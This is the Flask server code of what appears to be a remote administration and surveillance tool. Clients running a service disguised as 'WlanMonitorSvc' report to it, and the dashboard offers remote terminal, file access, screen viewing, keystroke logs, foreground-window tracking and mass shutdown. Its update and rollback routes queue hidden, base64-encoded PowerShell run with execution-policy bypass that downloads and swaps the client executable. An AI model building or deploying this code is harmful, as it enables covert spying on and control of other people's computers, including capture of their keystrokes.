from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE

bp = Blueprint('main', __name__)

@bp.route('/api/ping/<mac>')
def api_ping(mac):
    if mac in clients_db and is_online(clients_db[mac].get('last_seen', '')):
        return jsonify({"status": "online", "kl": clients_db[mac].get('kl', '0')})
    return jsonify({"status": "offline"})

@bp.route('/report', methods=['GET'])
def report_client():
    mac = request.args.get('mac')
    ver = request.args.get('ver')
    fg = request.args.get('fg', '')
    kl = request.args.get('kl', '')
    if mac and ver:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if mac not in clients_db:
            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str, "fg": fg, "kl": kl}
        else:
            clients_db[mac]["ver"] = ver
            clients_db[mac]["last_seen"] = time_str
            clients_db[mac]["fg"] = fg
            clients_db[mac]["kl"] = kl
            if "name" not in clients_db[mac]:
                clients_db[mac]["name"] = "未命名设备"

        save_db()

        # 长轮询机制：挂起等待最多15秒，高频率检测降低响应延迟到100ms
        for i in range(150):
            pending_file_cmd = clients_db[mac].get('pending_file_cmd', '')
            if pending_file_cmd:
                clients_db[mac]['pending_file_cmd'] = ''
                save_db()
                return pending_file_cmd, 200

            # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
            pending_cmd = clients_db[mac].get('pending_cmd', '')
            if pending_cmd:
                clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
                save_db()
                return pending_cmd, 200

            if i % 10 == 0:
                clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                save_db()

            time.sleep(0.1)

        # 循环结束前刷新最后心跳时间
        clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_db()
        return "SSID:" + clients_db[mac].get('name', '未命名设备'), 200

    return "Missing parameters", 400

@bp.route('/api/rename', methods=['POST'])
def api_rename():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    new_name = data.get('name')
    if mac in clients_db:
        clients_db[mac]['name'] = new_name
        save_db()
    return jsonify({"status": "ok"})

@bp.route('/update_mgmt', methods=['POST'])
def update_mgmt():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    new_ver = request.form.get('version')
    uploaded_file = request.files.get('file')

    if new_ver:
        new_ver_str = new_ver.strip()
        if uploaded_file and uploaded_file.filename != '':
            binary_content = uploaded_file.read()
            # 校验版本号是否被正确编译到二进制文件中
            if new_ver_str.encode('ascii', errors='ignore') not in binary_content:
                return f"<h2 style='color:red;'>错误：版本校验失败！</h2><p>您输入的版本号 {new_ver_str} 没有包含在上传的 EXE 文件内部。</p><p>请确保您已在 Visual Studio 的代码里修改了 MANUAL_COMPILE_VERSION 并成功重新生成了程序！</p><button onclick='history.back()'>返回重试</button>", 400

            ver_dir = os.path.join(UPDATE_DIR, 'history_versions', new_ver_str)
            os.makedirs(ver_dir, exist_ok=True)
            with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
                f.write(binary_content)

            with open(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'), 'wb') as f:
                f.write(binary_content)

        with open(VERSION_FILE, 'w', encoding='utf-8') as f:
            f.write(new_ver_str)

    import base64
    host_url = request.host_url.rstrip('/')

    def get_version(v_str):
        try: return [int(x) for x in v_str.strip().split('.')]
        except: return [0, 0, 0]

    # 下发全局紧急更新通知给所有在线设备
    for mac, info in clients_db.items():
        if is_online(info.get('last_seen', '')):
            client_ver = info.get('ver', '1.0.0')
            if get_version(client_ver) >= [1, 6, 10]:
                clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
            else:
                ps_cmd = (
                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                    "if (-not $p) { exit }; "
                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
                )
                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
                clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
    save_db()

    return redirect(url_for('main.index'))

@bp.route('/rollback_version', methods=['POST'])
def rollback_version():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    rollback_ver = request.form.get('version')
    if rollback_ver:
        ver_dir = os.path.join(UPDATE_DIR, 'history_versions', rollback_ver)
        exe_path = os.path.join(ver_dir, 'WlanMonitorSvc.exe')
        if os.path.exists(exe_path):
            import shutil
            shutil.copy(exe_path, os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'))
            with open(VERSION_FILE, 'w', encoding='utf-8') as f:
                f.write(rollback_ver)
            import base64
            host_url = request.host_url.rstrip('/')

            def get_version(v_str):
                try: return [int(x) for x in v_str.strip().split('.')]
                except: return [0, 0, 0]

            for mac, info in clients_db.items():
                if is_online(info.get('last_seen', '')):
                    client_ver = info.get('ver', '1.0.0')
                    if get_version(client_ver) >= [1, 6, 10]:
                        clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
                    else:
                        ps_cmd = (
                            "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                            "if (-not $p) { exit }; "
                            f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                            "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
                        )
                        ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
                        clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
            save_db()
    return redirect(url_for('main.index'))

@bp.route('/delete_version', methods=['POST'])
def delete_version():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    del_ver = request.form.get('version')
    if del_ver:
        ver_dir = os.path.join(UPDATE_DIR, 'history_versions', del_ver)
        if os.path.exists(ver_dir):
            import shutil
            shutil.rmtree(ver_dir)
    return redirect(url_for('main.index'))

@bp.route('/update_server', methods=['POST'])
def update_server():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    uploaded_app = request.files.get('app_file')

    if uploaded_app and uploaded_app.filename != '':
        uploaded_app.save(os.path.join(UPDATE_DIR, uploaded_app.filename))
        import threading
        import sys
        import time
        def restart_server():
            time.sleep(1) # 稍微延迟一下确保前端已经得到响应
            os.execv(sys.executable, [sys.executable] + sys.argv)
        threading.Thread(target=restart_server).start()

    return redirect(url_for('main.index'))

@bp.route('/update/<filename>')
def serve_update(filename):
    if filename not in ['version.txt', 'WlanMonitorSvc.exe']:
        return "拒绝访问", 403
    response = send_from_directory(UPDATE_DIR, filename)
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

@bp.route('/tables_partial')
def tables_partial():
    if not session.get('logged_in'): return "未登录"
    
    online_clients = {k: v for k, v in clients_db.items() if is_online(v.get('last_seen', ''))}
    offline_clients = {k: v for k, v in clients_db.items() if not is_online(v.get('last_seen', ''))}
    
    PARTIAL_HTML = """
    <h3>🟢 活跃在线设备列表 [ {{ online_clients|length }} 台 ]</h3>
    <div class="table-scroll" style="overflow-x: auto;">
    <table style="min-width: 800px;">
        <thead>
            <tr>
                <th><input type="checkbox" id="checkAll" onclick="toggleAll(this)"></th>
                <th>MAC 地址</th>
                <th>设备备注名</th>
                <th>当前运行版本</th>
                <th>当前焦点程序</th>
                <th>最后心跳时间</th>
                <th>快速操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in online_clients.items() %}
            <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
                <td><input type="checkbox" class="client-check" value="{{ mac }}"></td>
                <td><code>{{ mac }}</code></td>
                <td>
                    {{ info.name }} 
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td>v{{ info.ver }}</td>
                <td style="color:#007bff; font-weight:bold; max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="{{ info.fg|default('暂无') }}">{{ info.fg|default('暂无') }}</td>
                <td>{{ info.last_seen }}</td>
                <td>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /r /t 0')" style="background:#ffc107; color:#000; padding:4px 8px; font-size:12px;">重启</button>
                    <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
                    <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
                    <a href="/taskmgr/{{ mac }}" style="background:#6f42c1; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📊 任务管理</a>
                    <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
                    <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
                </td>
                <td class="status-online">📡 在线</td>
            </tr>
            {% else %}
            <tr><td colspan="8" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
            {% endfor %}
        </tbody>
    </table>
    </div>

    <div style="margin-bottom: 30px; background: #e9ecef; padding: 15px; border-radius: 8px;">
        <b>⚡ 批量操作 (已选设备):</b>
        <button onclick="batchCmd('shutdown /s /t 0')" style="background:#dc3545; margin-left:10px;">批量关机</button>
        <button onclick="batchCmd('shutdown /r /t 0')" style="background:#ffc107; color:#000; margin-left:10px;">批量重启</button>
        <button onclick="batchCmd('UPDATE_NOW')" style="background:#28a745; margin-left:10px;">强制检查更新</button>
    </div>

    <h3>🔴 离线设备记录 [ {{ offline_clients|length }} 台 ]</h3>
    <div class="table-scroll" style="overflow-x: auto;">
    <table style="min-width: 600px;">
        <thead>
            <tr>
                <th>MAC 地址</th>
                <th>最后已知名称</th>
                <th>离线前版本</th>
                <th>最近一次连接时间</th>
                <th>操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in offline_clients.items() %}
            <tr>
                <td style="color:#777;"><code>{{ mac }}</code></td>
                <td style="color:#777;">
                    {{ info.name }}
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td style="color:#777;">v{{ info.ver }}</td>
                <td style="color:#777;">{{ info.last_seen }}</td>
                <td>
                    <a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block;">📝 查看遗留日志</a>
                    <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
                </td>
                <td class="status-offline">已离线</td>
            </tr>
            {% else %}
            <tr><td colspan="6" style="text-align: center; color: #888;">暂无离线历史记录</td></tr>
            {% endfor %}
        </tbody>
    </table>
    </div>
    """
    return render_template_string(PARTIAL_HTML, online_clients=online_clients, offline_clients=offline_clients)

@bp.route('/', methods=['GET'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('auth.login'))

    current_server_version = "未知版本"
    if os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, 'r', encoding='utf-8') as f:
            current_server_version = f.read().strip()

    history_versions = []
    history_dir = os.path.join(UPDATE_DIR, 'history_versions')
    if os.path.exists(history_dir):
        for d in os.listdir(history_dir):
            if os.path.isdir(os.path.join(history_dir, d)):
                if os.path.exists(os.path.join(history_dir, d, 'WlanMonitorSvc.exe')):
                    history_versions.append(d)
    try:
        history_versions.sort(key=lambda s: [int(x) if x.isdigit() else x for x in s.split('.')], reverse=True)
    except:
        history_versions.sort(reverse=True)

    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>控制台设备管理</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
            .container { max-width: 1100px; margin: 0 auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; margin-top: 10px; margin-bottom: 30px; user-select: none; }
            th, td { padding: 10px 10px; border-bottom: 1px solid #ddd; text-align: left; }
            th { background-color: #007bff; color: white; }
            tr:hover { background-color: #f1f1f1; }
            .status-online { color: #28a745; font-weight: bold; }
            .status-offline { color: #dc3545; font-weight: bold; }
            .mgmt-box { background: #e9ecef; padding: 15px; border-radius: 8px; margin-bottom: 20px; overflow-wrap: break-word; }
            input[type="text"], input[type="file"], select { padding: 8px; margin-right: 10px; border: 1px solid #ccc; border-radius:4px; max-width: 100%; box-sizing: border-box; }
            button { padding: 8px 15px; background: #007bff; border: none; border-radius: 4px; cursor: pointer; color: white; margin: 2px; }
            button:hover { background: #0056b3; }
            .logout { float: right; padding:8px 15px; background: #dc3545; border-radius: 4px; text-decoration: none; color: #fff;}
            .main-context { display: none; position: absolute; z-index: 1000; background: white; border: 1px solid #ccc; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); border-radius: 4px; padding: 5px 0; min-width: 150px; }
            .main-context-item { padding: 8px 15px; cursor: pointer; font-size: 14px; }
            .main-context-item:hover { background-color: #007bff; color: white; }
        </style>
    </head>
    <body>
        <div class="container" onclick="window.hideMainContextMenu && window.hideMainContextMenu()">
            <a href="/logout" class="logout">注销退出</a>
            <h1 style="margin-top:0;">💻 设备综合管理后台</h1>

            <div class="mgmt-box">
                <h3 style="margin-top:0;">🛠 发布强制客户端更新</h3>
                <p>当前全网服务器提供的最新强制更新版本号：<b style="color:red; font-size:18px;">{{ current_server_version }}</b></p>
                <form action="/update_mgmt" method="post" enctype="multipart/form-data">
                    <label>1. 发布新版本号(填入更高版本号单下发更新通知):</label><br>
                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 10px 0; width: 250px;">
                    <br>
                    <label>2. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
                    <input type="file" name="file" accept=".exe" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">更新并发布推送全网</button>
                </form>

                <hr style="border: 1px solid #ccc; margin: 20px 0;">

                <h3 style="margin-top:0;">⏪ 历史版本与回退管理</h3>
                <form action="/rollback_version" method="post">
                    <label>选择历史版本记录进行管理:</label><br>
                    <select name="version" style="margin: 10px 0; width: 250px;">
                        {% for v in history_versions %}
                        <option value="{{ v }}" {% if v == current_server_version %}selected{% endif %}>{{ v }}</option>
                        {% endfor %}
                    </select>
                    <br>
                    <button type="submit" style="background:#ffc107; color:black; padding: 10px 20px;" onclick="return confirm('确定要令全网终端强制回退到该版本吗？')">强推全网回退该版本</button>
                    <button type="submit" formaction="/delete_version" style="background:#dc3545; padding: 10px 20px;" onclick="return confirm('确定要删除该历史版本记录的服务端文件吗？')">删除服务器文件记录</button>
                </form>

                <hr style="border: 1px solid #ccc; margin: 20px 0;">

                <h3 style="margin-top:0;">⚙️ 热更新服务端代码</h3>
                <form action="/update_server" method="post" enctype="multipart/form-data">
                    <label>支持热更新服务端所有 .py 文件 (如 app.py, core.py, bp_main.py等)，同名覆盖完毕后将自动重启服务端。</label><br>
                    <input type="file" name="app_file" accept=".py" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#17a2b8; padding: 10px 20px; margin-top:5px;">更新并重启服务端</button>
                </form>
            </div>

            <!-- 数据列表挂载容器 -->
            <div id="target-tables">正在建立实时通信环境获取设备库并连接设备...</div>

            <!-- 主界面右键菜单 -->
            <div id="main-context" class="main-context">
                <div class="main-context-item" onclick="onMainContextAction('shutdown /s /t 0')">🔴 批量关机</div>
                <div class="main-context-item" onclick="onMainContextAction('shutdown /r /t 0')">🔄 批量重启</div>
                <div class="main-context-item" onclick="onMainContextAction('UPDATE_NOW')" style="color:green;">🚀 强制更新</div>
            </div>

        </div>

        <script>
            let isUserInteracting = false;
            window.addEventListener('touchstart', function() { isUserInteracting = true; }, {passive: true});
            window.addEventListener('touchend', function() { setTimeout(function(){ isUserInteracting = false; }, 1000); });
            window.addEventListener('mousedown', function() { isUserInteracting = true; });
            window.addEventListener('mouseup', function() { setTimeout(function(){ isUserInteracting = false; }, 1000); });

            // 定时使用 AJAX 异步拉取表格更新，达到实时无感动态列表
            function fetchTables() {
                if (isUserInteracting) return; // 如果用户正在进行触摸滑动操作，则暂时不刷新DOM以免打断用户

                // 1. 保存当前勾选的设备MAC
                var checkedMacs = [];
                var checkboxes = document.querySelectorAll('.client-check:checked');
                checkboxes.forEach(c => checkedMacs.push(c.value));

                // 记录当前的表格横向滚动位置
                var scrollContainers = document.querySelectorAll('.table-scroll');
                var scrollPositions = [];
                scrollContainers.forEach(c => scrollPositions.push(c.scrollLeft));

                fetch('/tables_partial')
                    .then(response => response.text())
                    .then(html => {
                        document.getElementById('target-tables').innerHTML = html;

                        // 恢复表格滚动的横向位置
                        var newScrollContainers = document.querySelectorAll('.table-scroll');
                        newScrollContainers.forEach((c, i) => {
                            if (scrollPositions[i] !== undefined) {
                                c.scrollLeft = scrollPositions[i];
                            }
                        });

                        // 2. 渲染新表格后恢复勾选状态
                        var newCheckboxes = document.querySelectorAll('.client-check');
                        var checkCount = 0;
                        newCheckboxes.forEach(c => {
                            if (checkedMacs.includes(c.value)) {
                                c.checked = true;
                                checkCount++;
                            }
                        });

                        // 3. 恢复顶部全选框的显示状态
                        var checkAllBtn = document.getElementById('checkAll');
                        if (checkAllBtn && newCheckboxes.length > 0 && checkCount === newCheckboxes.length) {
                            checkAllBtn.checked = true;
                        }
                    });
            }

            // 初始化立即加载，然后每间隔 1 秒刷一次
            fetchTables();
            setInterval(fetchTables, 1000);

            // 通过 JS 发送重命名更新（防止由于全页面刷新打断用户填写或者页面滚动异常）
            window.promptRename = function(mac, oldname) {
                var newname = prompt("给该设备重命名为:", oldname);
                if(newname && newname !== oldname) {
                    fetch('/api/rename', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ mac: mac, name: newname })
                    }).then(() => {
                        fetchTables(); // 直接刷新列表看到新名称
                    });
                }
            };

            window.showMainContextMenu = function(e) {
                e.preventDefault();
                let clickedCheckbox = e.currentTarget.querySelector('.client-check');
                if (clickedCheckbox && !clickedCheckbox.checked) {
                    clickedCheckbox.checked = true;
                }

                let menu = document.getElementById('main-context');
                if (menu) {
                    menu.style.display = 'block';
                    menu.style.left = e.pageX + 'px';
                    menu.style.top = e.pageY + 'px';
                }
            };

            window.hideMainContextMenu = function() {
                let menu = document.getElementById('main-context');
                if(menu) menu.style.display = 'none';
            };

            window.onMainContextAction = function(cmd) {
                hideMainContextMenu();
                window.batchCmd(cmd);
            };

            window.toggleAll = function(source) {
                var checkboxes = document.querySelectorAll('.client-check');
                for(var i=0; i<checkboxes.length; i++) checkboxes[i].checked = source.checked;
            };

            window.quickCmd = function(mac, cmd) {
                if(!confirm("确定要对该机器执行: " + cmd + " 吗？")) return;
                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: mac, cmd: cmd})
                }).then(() => alert("已下发"));
            };

            window.batchCmd = function(cmd) {
                var checked = document.querySelectorAll('.client-check:checked');
                var macs = [];
                checked.forEach(c => macs.push(c.value));
                if(macs.length === 0) return alert("请先勾选需要的设备");
                if(!confirm("确定要对选中的 " + macs.length + " 台机器执行: " + cmd + " 吗？")) return;

                fetch('/api/batch_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({macs: macs, cmd: cmd})
                }).then(() => alert("批量指令已下发"));
            };
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, current_server_version=current_server_version, history_versions=history_versions)
